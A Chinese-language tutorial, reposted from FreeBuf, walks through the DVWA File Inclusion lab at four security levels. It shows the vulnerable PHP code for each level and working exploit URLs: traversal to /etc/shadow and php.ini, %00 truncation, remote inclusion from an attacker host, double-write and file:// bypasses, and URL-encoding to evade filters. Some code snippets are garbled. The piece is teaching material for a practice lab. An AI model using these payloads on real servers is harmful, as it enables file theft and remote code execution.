### ****File Inclusion****

File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow\_url\_include选项时，就可以通过php的某些特性函数（include()，require()和include\_once()，require\_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow\_url\_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。

[![1.png](http://image.3001.net/images/20161106/14784220172185.png!small)](http://image.3001.net/images/20161106/14784220172185.png)

下面对四种级别的代码进行分析。

****Low****
-----------

服务器端核心代码

```
<php      
//Thepagewewishtodisplay      
$file=$_GET['page'];      
>
```


可以看到，服务器端对page参数没有做任何的过滤跟检查。

服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。

[![1.png](http://image.3001.net/images/20161106/14784220488447.png!small)](http://image.3001.net/images/20161106/14784220488447.png)

点击file1.php后，显示如下

[![1.png](http://image.3001.net/images/20161106/14784220802790.png!small)](http://image.3001.net/images/20161106/14784220802790.png)

而现实中，恶意的攻击者是不会乖乖点击这些链接的，因此page参数是不可控的。

### ****漏洞利用****

1.本地文件包含

构造url

> [http://192.168.153.130/dvwa/vulnerabilities/fi/page=/etc/shadow](http://www.example.com/)

[![1.png](http://image.3001.net/images/20161106/14784221284731.png!small)](http://image.3001.net/images/20161106/14784221284731.png)

报错，显示没有这个文件，说明不是服务器系统不是Linux，但同时暴露了服务器文件的绝对路径C:\\xampp\\htdocs。

构造url（绝对路径）

> [http://192.168.153.130/dvwa/vulnerabilities/fi/page=C:\\xampp\\htdocs\\dvwa\\php.ini](http://www.example.com/)

成功读取了服务器的php.ini文件

[![1.png](http://image.3001.net/images/20161106/1478422166374.png!small)](http://image.3001.net/images/20161106/1478422166374.png)

构造url（相对路径）

> [http://192.168.153.130/dvwa/vulnerabilities/fi/page=..\\..\\..\\..\\..\\..\\..\\..\\..\\xampp\\htdocs\\dvwa\\php.ini](http://www.example.com/)

加这么多..\\是为了保证到达服务器的C盘根目录，可以看到读取是成功的。

[![1.png](http://image.3001.net/images/20161106/14784222219706.png!small)](http://image.3001.net/images/20161106/14784222219706.png)

同时我们看到，配置文件中的Magic\_quote\_gpc选项为off。在php版本小于5.3.4的服务器中，当Magic\_quote\_gpc选项为off时，我们可以在文件名中使用%00进行截断，也就是说文件名中%00后的内容不会被识别，即下面两个url是完全等效的。

> A)[http://192.168.153.130/dvwa/vulnerabilities/fi/page=..\\..\\..\\..\\..\\..\\..\\..\\..\\xampp\\htdocs\\dvwa\\php.ini](http://www.example.com/)
> 
> B)[http://192.168.153.130/dvwa/vulnerabilities/fi/page=..\\..\\..\\..\\..\\..\\..\\..\\..\\xampp\\htdocs\\dvwa\\php.ini%0012.php](http://www.example.com/)

可惜的是由于本次实验环境的php版本为5.4.31，所以无法进行验证。

[![1.png](http://image.3001.net/images/20161106/14784222529627.png!small)](http://image.3001.net/images/20161106/14784222529627.png)

使用%00截断可以绕过某些过滤规则，例如要求page参数的后缀必须为php，这时链接A会读取失败，而链接B可以绕过规则成功读取。

2.远程文件包含

当服务器的php配置中，选项allow\_url\_fopen与allow\_url\_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。

在远程服务器192.168.5.12上传一个phpinfo.txt文件，内容如下

[![1.png](http://image.3001.net/images/20161106/14784222814815.png!small)](http://image.3001.net/images/20161106/14784222814815.png)

构造url

> [http://192.168.153.130/dvwa/vulnerabilities/fi/page=http://192.168.5.12/phpinfo.txt](http://www.example.com/)

成功在服务器上执行了phpinfo函数

[![1.png](http://image.3001.net/images/20161106/14784223166097.png!small)](http://image.3001.net/images/20161106/14784223166097.png)

为了增加隐蔽性，可以对[http://192.168.5.12/phpinfo.txt](http://192.168.5.12/phpinfo.txt)进行编码

> [http://192.168.153.130/dvwa/vulnerabilities/fi/page=%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%35%2e%31%32%2f%70%68%70%69%6e%66%6f%2e%74%78%74](http://www.example.com/)

同样可以执行成功

[![1.png](http://image.3001.net/images/20161106/14784223562200.png!small)](http://image.3001.net/images/20161106/14784223562200.png)

****Medium****
--------------

服务器端核心代码

```
<php       
//Thepagewewishtodisplay      
$file=$_GET['page'];       
//Inputvalidation      
$file=str_replace(array("http://","https://"),"",$file);      
$file=str_replace(array("../","..\""),"",$file);       1
>
```


可以看到，Medium级别的代码增加了str\_replace函数，对page参数进行了一定的处理，将”http:// ”、”https://”、 ” ../”、”..\\”替换为空字符，即删除。

### ****漏洞利用****

使用str\_replace函数是极其不安全的，因为可以使用双写绕过替换规则。

例如page=[hthttp://tp://192.168.5.12/phpinfo.txt](http://www.example.com/)时，str\_replace函数会将http://删除，于是page=[http://192.168.5.12/phpinfo.txt](http://192.168.5.12/phpinfo.txt)，成功执行远程命令。

同时，因为替换的只是“../”、“..\\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。

1.本地文件包含

> [http://192.168.153.130/dvwa/vulnerabilities/fi/page=…/./…/./…/./…/./…/./…/./…/./…/./…/./…/./xampp/htdocs/dvwa/php.ini](http://www.example.com/)

读取配置文件成功

[![1.png](http://image.3001.net/images/20161106/14784223912895.png!small)](http://image.3001.net/images/20161106/14784223912895.png)

> [http://192.168.153.130/dvwa/vulnerabilities/fi/page=C:/xampp/htdocs/dvwa/php.ini](http://www.example.com/)

绝对路径不受任何影响，读取成功

[![1.png](http://image.3001.net/images/20161106/1478422430551.png!small)](http://image.3001.net/images/20161106/1478422430551.png)

2.远程文件包含

> [http://192.168.153.130/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt](http://www.example.com/)

远程执行命令成功

[![1.png](http://image.3001.net/images/20161106/14784224607432.png!small)](http://image.3001.net/images/20161106/14784224607432.png)

> [http://192.168.153.130/dvwa/vulnerabilities/fi/page=%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%35%2e%31%32%2f%70%68%70%69%6e%66%6f%2e%74%78%74](http://www.example.com/)

经过编码后的url不能绕过替换规则，因为解码是在浏览器端完成的，发送过去的page参数依然是[http://192.168.5.12/phpinfo.txt](http://192.168.5.12/phpinfo.txt)，因此读取失败。

[![1.png](http://image.3001.net/images/20161106/14784224905493.png!small)](http://image.3001.net/images/20161106/14784224905493.png)

****High****
------------

服务器端核心代码

```
<php       
//Thepagewewishtodisplay      
$file=$_GET['page'];       
//Inputvalidation      
if(!fnmatch("file*",$file)&&$file!="include.php"){      
   //Thisisn'tthepagewewant!      
echo"ERROR:Filenotfound!";      1
exit;      1
}       1
>
```


可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。

### ****漏洞利用****

High级别的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以利用file协议绕过防护策略。file协议其实我们并不陌生，当我们用浏览器打开一个本地文件时，用的就是file协议，如下图。

[![1.png](http://image.3001.net/images/20161106/14784225304478.png!small)](http://image.3001.net/images/20161106/14784225304478.png)

构造url

> [http://192.168.153.130/dvwa/vulnerabilities/fi/page=file:///C:/xampp/htdocs/dvwa/php.ini](http://www.example.com/)

成功读取了服务器的配置文件

[![1.png](http://image.3001.net/images/20161106/14784225715815.png!small)](http://image.3001.net/images/20161106/14784225715815.png)

至于执行任意命令，需要配合文件上传漏洞利用。首先需要上传一个内容为php的文件，然后再利用file协议去包含上传文件（需要知道上传文件的绝对路径），从而实现任意命令执行。

****Impossible****
------------------

服务器端核心代码

```
<php      
//Thepagewewishtodisplay      
$file=$_GET['page'];       
//Onlyallowinclude.phporfile{1..3}.php      
if($file!="include.php"&&$file!="file1.php"&&$file!="file2.php"&&$file!="file3.php"){      
//Thisisn'tthepagewewant!      
echo"ERROR:Filenotfound!";      
exit;      1
}       1
>
```


可以看到，Impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。

**\*本文原创作者：lonehand**

**转自：[http://www.freebuf.com/articles/web/119150.html](http://www.freebuf.com/articles/web/119150.html)**